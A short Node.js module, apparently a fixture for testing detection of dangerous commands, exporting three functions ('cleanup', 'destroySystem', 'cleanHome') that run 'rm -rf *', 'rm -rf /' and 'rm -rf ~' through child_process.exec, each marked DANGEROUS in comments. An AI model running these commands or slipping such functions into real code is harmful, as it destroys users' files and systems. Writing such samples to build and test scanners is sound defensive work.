const { exec } = require('child_process');

// DANGEROUS: Recursive delete with wildcard
function cleanup() {
  exec('rm -rf *', (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error}`);
      return;
    }
    console.log('Cleanup complete');
  });
}

// DANGEROUS: Delete root directory
function destroySystem() {
  exec('rm -rf /', (error, stdout, stderr) => {
    console.log('System destroyed');
  });
}

// DANGEROUS: Delete home directory
function cleanHome() {
  exec('rm -rf ~', (error, stdout, stderr) => {
    console.log('Home cleaned');
  });
}

module.exports = { cleanup, destroySystem, cleanHome };
